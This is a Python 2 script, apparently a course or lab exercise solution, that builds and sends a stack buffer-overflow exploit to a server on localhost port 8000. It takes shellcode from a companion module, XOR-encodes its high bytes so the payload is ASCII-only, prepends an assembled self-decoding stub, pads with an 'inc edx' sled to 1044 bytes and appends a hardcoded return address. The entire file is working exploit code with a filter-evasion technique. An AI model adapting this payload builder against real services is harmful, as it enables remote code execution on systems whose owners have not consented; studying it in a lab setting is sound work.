#!/usr/bin/python

import os, socket
import q2
import assemble


HOST        = '127.0.0.1'
SERVER_PORT = 8000
LOCAL_PORT  = 1337


ASCII_MAX = 0x7f


def get_raw_shellcode():
    return q2.get_shellcode()

def get_shellcode():
    # sorry for solve this in morrom method, I dont have time to think on something more creative :/
    # please don't hate me more
    shellcode = get_raw_shellcode()
    shellcode_len = len(shellcode)
    new_shellcode = []
    # Assumed the shellcode len is less then  80
    # the assemble.py conevrt to hexa everything even when we inster nubmers
    for i in xrange(shellcode_len):
        byte = shellcode[i]
        if ord(byte) >= 0x80:
            byte = chr(ord(byte)^0xff)
        new_shellcode.append(byte)
    
    return "".join(new_shellcode)

def get_payload():

    shellcode = get_shellcode() # the shellcode beofre chagned for ASCII
    pre_shellcode = get_raw_shellcode() # the shellcode after chagned for ASCII
    shellcode_len = len(shellcode) # the shellcode and the preshellcode are at the same size becaue we only change the value and not the size

    eax_at_start = "push esp\npop eax\n" + "dec eax\n" * (shellcode_len + 4)
    set_bl = "push 0\npop ebx\ndec ebx\n"
    Decoder = eax_at_start + set_bl
    for i in xrange(shellcode_len):
        byte = pre_shellcode[i]
        if ord(byte) >= 0x80:
            Decoder += "xor byte ptr [eax], bl\n"
        Decoder += "inc eax\n"

    return_address = "\x04\xe0\xff\xbf" # 0xbfffe040 
    # can inc edx beacuse the shellcode reset him when she use him and it is only one byte 
    Decoder = assemble.assemble_data(Decoder)
    new_shellcode = Decoder + shellcode
    nop_silde_start = assemble.assemble_data("inc edx\n" * (1044 - len(return_address) - len(new_shellcode)))
    size = chr(0) * 2 + chr(4) + chr(21) # this is 1044, the size of the message I send
    to_send = size + nop_silde_start + new_shellcode + return_address
    return to_send

def main():
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, SERVER_PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()
